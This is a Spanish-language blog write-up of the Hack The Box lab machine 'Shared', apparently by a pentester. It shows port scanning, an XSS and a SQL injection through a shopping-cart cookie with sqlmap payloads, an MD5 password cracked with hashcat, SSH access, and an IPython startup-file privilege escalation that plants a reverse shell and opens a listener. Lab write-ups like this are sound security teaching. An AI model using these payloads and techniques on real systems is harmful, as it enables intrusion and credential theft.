<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-shared-writeup">Hack The Box: Shared Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Shared&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.250.135 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.250.135 -&gt; <span style="color:#f92672">[</span>22,80,443<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80,443 -sCV 10.129.250.135 -oN allPorts 
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-07 13:22 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.250.135
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://shared.htb
</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>*.shared.htb/organizationName<span style="color:#f92672">=</span>HTB/stateOrProvinceName<span style="color:#f92672">=</span>None/countryName<span style="color:#f92672">=</span>US
</span></span><span style="display:flex;"><span>| Not valid before: 2022-03-20T13:37:14
</span></span><span style="display:flex;"><span>|_Not valid after:  2042-03-15T13:37:14
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|   h2
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://shared.htb
</span></span><span style="display:flex;"><span>| tls-nextprotoneg: 
</span></span><span style="display:flex;"><span>|   h2
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.09 seconds
</span></span></code></pre></div><p>Descubrimos el dominio <code>shared.htb</code> , lo a√±adimos al <code>/etc/hosts</code></p>
<p>Con <code>openssl s_client -showcerts -connect shared.htb:443</code> podemos ver el certificado TLS, pero no encontramos nada relevante.</p>
<h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.250.135 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-07 13:25 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.250.135
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1494</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>639/udp   closed msdp
</span></span><span style="display:flex;"><span>782/udp   closed hp-managed-node
</span></span><span style="display:flex;"><span>22611/udp closed unknown
</span></span><span style="display:flex;"><span>27707/udp closed unknown
</span></span><span style="display:flex;"><span>49198/udp closed unknown
</span></span><span style="display:flex;"><span>54321/udp closed bo2k
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.84 seconds
</span></span></code></pre></div><h1 id="http-enumeration">HTTP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://shared.htb
</span></span><span style="display:flex;"><span>http://shared.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>nginx/1.18.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.250.135<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>https://shared.htb/<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>https://shared.htb/ <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>nginx/1.18.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.250.135<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>https://shared.htb/index.php<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>https://shared.htb/index.php <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Cookies<span style="color:#f92672">[</span>PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>nginx/1.18.0<span style="color:#f92672">]</span>, HttpOnly<span style="color:#f92672">[</span>PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.250.135<span style="color:#f92672">]</span>, JQuery, Open-Graph-Protocol<span style="color:#f92672">[</span>website<span style="color:#f92672">]</span>, PoweredBy<span style="color:#f92672">[</span>PrestaShop<span style="color:#f92672">]</span>, PrestaShop<span style="color:#f92672">[</span>EN<span style="color:#f92672">]</span>, Script<span style="color:#f92672">[</span>application/ld+json,text/javascript<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Shared Shop<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>ie<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.18.0<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Parece un PrestaShop</p>
<blockquote>
<p><em>PrestaShop</em> is an Open Source e-commerce web application, committed to providing the best shopping cart experience for both merchants and customers</p>
</blockquote>
<p>Por HTTPS me redirecciona al PrestaShop tambi√©n.</p>
<p>Podemos comprobar si est√° el t√≠pico archivo <code>INSTALL.txt</code> para comprobar la versi√≥n del CMS.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Aunque en el footer.</p>
<p>Tras buscar por la versi√≥n encuentro varias vulnerabilidades, pero para la mayor√≠a necesito estar autenticado. Existen algunas SQLi pero no es vulnerable parece ser.</p>
<p>Con <code>wfuzz</code> podemos enumerar subdominios, y encontramos uno, <code>checkout.shared.htb</code> , lo a√±adimos al <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wfuzz --hh<span style="color:#f92672">=</span><span style="color:#ae81ff">169</span> -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span style="color:#e6db74">&#39;Host: FUZZ.shared.htb&#39;</span> http://shared.htb
</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://shared.htb/
</span></span><span style="display:flex;"><span>Total requests: 114441
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                  
</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000000001:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch        <span style="color:#e6db74">&#34;www&#34;</span>                    
</span></span><span style="display:flex;"><span>000002549:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">64</span> L     <span style="color:#ae81ff">151</span> W      <span style="color:#ae81ff">3229</span> Ch     <span style="color:#e6db74">&#34;checkout&#34;</span>               
</span></span><span style="display:flex;"><span>^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Total time: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">2911</span>
</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">2909</span>
</span></span><span style="display:flex;"><span>Requests/sec.: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>Un poco extra√±o este subdominio, y cuando visualmente no tiene buena pinta es por algo..
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Podemos a√±adir un producto al carrito desde el dominio principal y se ve reflejado en este subdominio.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p><img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Esto se esta realizando debido a una cookie llamada <code>custom_cart</code></p>
<p><img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<h2 id="xss">XSS</h2>
<p>Podemos hacer un URL Decode y modificar la cookie mas c√≥modamente.
<code>{&quot;CRAAFTKP&quot;:&quot;1&quot;}</code></p>
<p>Descubrimos un XSS si inyectamos una etiqueta <code>script</code> en el campo de cantidad
<code>{&quot;CRAAFTKP&quot;:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;}</code></p>
<p><img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<h2 id="sql-injection">SQL Injection</h2>
<p>Pero la cosa se pone mas interesante, ya que si por ejemplo, modificamos el nombre del producto..
<code>{&quot;NOEXISTO&quot;:&quot;1&quot;}</code>
<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Esto significa que se est√° haciendo una consulta por detr√°s a la base de datos, pasando el valor de esta cookie.
Podemos probar a hacer una SQLi b√°sica de comprobaci√≥n
<code>{&quot; ' or 1=1-- -&quot;:&quot;1&quot;}</code></p>
<p>Si me representa un objeto significa que esa consulta ha devuelto algo y por lo cual es vulnerable a SQLi.</p>
<p>Vaya..
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>A mi me gusta hacer scripts pero hoy he tenido un d√≠a movidito as√≠ que vamos a utilizar <code>sqlmap</code>, que tampoco es delito utilizarlo.</p>
<p>Tardamos un poco en conseguir el payload correcto con <code>sqlmap</code> pero tras unos minutos&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> -u https://checkout.shared.htb/ --batch  --os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;*&#34;:&#34;1&#34;}&#39;</span> --dbms<span style="color:#f92672">=</span>mysql
</span></span><span style="display:flex;"><span>....
</span></span><span style="display:flex;"><span>sqlmap identified the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a total of <span style="color:#ae81ff">2903</span> HTTP<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> requests:
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>Parameter: Cookie <span style="color:#75715e">#1* ((custom) HEADER)</span>
</span></span><span style="display:flex;"><span>    Type: time-based blind
</span></span><span style="display:flex;"><span>    Title: MySQL &gt; 5.0.12 AND time-based blind <span style="color:#f92672">(</span>heavy query<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Payload: custom_cart<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;&#39; AND 6293=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- xuSZ&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Type: UNION query
</span></span><span style="display:flex;"><span>    Title: Generic UNION query <span style="color:#f92672">(</span>NULL<span style="color:#f92672">)</span> - <span style="color:#ae81ff">4</span> columns
</span></span><span style="display:flex;"><span>    Payload: custom_cart<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;&#39; UNION ALL SELECT NULL,CONCAT(0x7178787071,0x5555627a4458716f72716658504b706b58727a6f506a43436b414a5a547a656c42675a624f685453,0x7162627a71),NULL-- -&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12:07:13<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
</span></span><span style="display:flex;"><span>web application technology: Nginx 1.18.0
</span></span><span style="display:flex;"><span>back-end DBMS: MySQL &gt; 5.0.12 <span style="color:#f92672">(</span>MariaDB fork<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12:07:13<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetched data logged to text files under <span style="color:#e6db74">&#39;/home/pointedsec/.local/share/sqlmap/output/checkout.shared.htb&#39;</span>
</span></span></code></pre></div><h1 id="enumerating-database---foothold">Enumerating Database -&gt; Foothold</h1>
<p>Y ya podemos ir enumerando con <code>sqlmap</code>
Podemos ver que hay dos bases de datos.
[<em>] checkout
[</em>] information_schema</p>
<p>En la base de datos <code>checkout</code> hay dos tablas.
[2 tables]
+&mdash;&mdash;&mdash;+
| user    |
| product |
+&mdash;&mdash;&mdash;+</p>
<p>Y dentro de la tabla <code>user</code> encontramos un registro</p>
<pre tabindex="0"><code>+----+----------------------------------+-------------+
| id | password                         | username    |
+----+----------------------------------+-------------+
| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
+----+----------------------------------+-------------+
</code></pre><p>Podemos revisar en <a href="https://hashes.com/en/decrypt/hash">hashes.com</a> y vemos que este hash ya hab√≠a sido roto anteriormente.
<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Aunque con <code>hashcat</code> podr√≠amos crackear este hash. Podemos hacer una b√∫squeda en Google y ver que en la versi√≥n 1.7 de PrestaShop se hasheaba las contrae√±as en MD5, cosa que tambi√©n podemos ver visualmente ya que el hash se parece.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">0</span> hash /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span> ...
</span></span><span style="display:flex;"><span> fc895d4eddc2fc12f995e18c865cf273:Soleil101                
</span></span><span style="display:flex;"><span>                                                          
</span></span><span style="display:flex;"><span>Session..........: hashcat
</span></span><span style="display:flex;"><span>Status...........: Cracked
</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>MD5<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Hash.Target......: fc895d4eddc2fc12f995e18c865cf273
</span></span><span style="display:flex;"><span>Time.Started.....: Wed Aug  <span style="color:#ae81ff">7</span> 12:12:09 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Time.Estimated...: Wed Aug  <span style="color:#ae81ff">7</span> 12:12:10 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Bien, tenemos unas credenciales
<code>james_mason:Soleil101</code></p>
<p>Mi idea era ganar acceso a trav√©s del PrestaShop, pero podemos iniciar sesi√≥n con estas credenciales a trav√©s del SSH.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sshpass -p <span style="color:#e6db74">&#39;Soleil101&#39;</span> ssh james_mason@shared.htb 
</span></span><span style="display:flex;"><span>Linux shared 5.10.0-16-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Thu Jul <span style="color:#ae81ff">14</span> 14:45:22 <span style="color:#ae81ff">2022</span> from 10.10.14.4
</span></span><span style="display:flex;"><span>james_mason@shared:~$ whoami
</span></span><span style="display:flex;"><span>james_mason
</span></span></code></pre></div><h1 id="user-pivoting">User Pivoting</h1>
<p>Vemos que hay otro usuario en la m√°quina llamado <code>dan_smith</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:/home$ cat /etc/passwd | grep bash
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
</span></span><span style="display:flex;"><span>dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
</span></span></code></pre></div><p>Podemos ver los archivos del directorio personal de trabajo de <code>dan_smith</code> y vemos un directorio <code>.ipython</code>
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Encontramos algunos fallos de seguridad asociados a <code>ipython</code></p>
<p><a href="https://github.com/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/advisories/GHSA-pq7m-3gw7-gq5x</a></p>
<p>En principio, si tengo permiso de escritura en alguna parte del sistema donde el usuario <code>dan_smith</code> est√© ejecutando <code>ipython</code> , podr√≠a ejecutar comandos como este usuario.
<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Esto es porque <code>ipython &lt; 8.0.0</code> ejecuta archivos sin importar de que usuario provengan que est√©n en el CWD (Current Working Directory). Por lo cual esto permitir√≠a a un usuario ejecutar c√≥digo como otro.</p>
<p>Bien, primero hay que saber que versi√≥n de <code>ipython</code> tiene la m√°quina v√≠ctima.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$  /usr/local/bin/ipython --version
</span></span><span style="display:flex;"><span>8.0.0
</span></span></code></pre></div><p>Genial, ahora solo tenemos que descubrir donde podemos aprovecharnos de este fallo.</p>
<p>Como esto es un CTF, me imagino que habr√° una tarea cron por detr√°s de este usuario, podemos compartirnos el <code>pspy64</code> y ejecutarlo en la m√°quina v√≠ctima.</p>
<p>Y vemos lo siguiente</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>2024/08/07 06:28:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span>  PID<span style="color:#f92672">=</span><span style="color:#ae81ff">2748</span>   | 
</span></span><span style="display:flex;"><span>2024/08/07 06:28:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span>  PID<span style="color:#f92672">=</span><span style="color:#ae81ff">2749</span>   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ <span style="color:#f92672">&amp;&amp;</span> /usr/local/bin/ipython 
</span></span><span style="display:flex;"><span>2024/08/07 06:28:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span>  PID<span style="color:#f92672">=</span><span style="color:#ae81ff">2750</span>   | /usr/bin/python3 /usr/local/bin/ipython
</span></span></code></pre></div><p>Vemos que <code>dan_smith</code> est√° ejecutando <code>ipython</code> en el directorio <code>/opt/scripts_review</code>
<code>dan_smith:x:1001:1002::/home/dan_smith:/bin/bash</code> -&gt; UID 1001</p>
<p>Como pertenecemos al grupo <code>developers</code>, tenemos permiso de escritura en este directorio.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:/opt$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2022</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root root      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2022</span> ..
</span></span><span style="display:flex;"><span>drwxrwx---  <span style="color:#ae81ff">2</span> root developer <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2022</span> scripts_review
</span></span><span style="display:flex;"><span>james_mason@shared:/opt$ cd scripts_review/^C
</span></span><span style="display:flex;"><span>james_mason@shared:/opt$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Preparamos un archivo <code>/tmp/pwn.py</code> donde vamos a cargar esta reverse shell de <a href="https://www.revshells.com/">revshells.com</a>
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>Creamos los directorios&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:/tmp$ mkdir -m <span style="color:#ae81ff">777</span> /opt/scripts_review/profile_default
</span></span><span style="display:flex;"><span>james_mason@shared:/tmp$ mkdir -m <span style="color:#ae81ff">777</span> /opt/scripts_review/profile_default/startup
</span></span></code></pre></div><p>Copiamos nuestro <code>pwn.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:/tmp$ cp pwn.py /opt/scripts_review/profile_default/startup/.
</span></span></code></pre></div><p>Y nos ponemos en escucha con <code>pwncat-cs</code> por el puerto 443</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo pwncat-cs -lp <span style="color:#ae81ff">443</span>
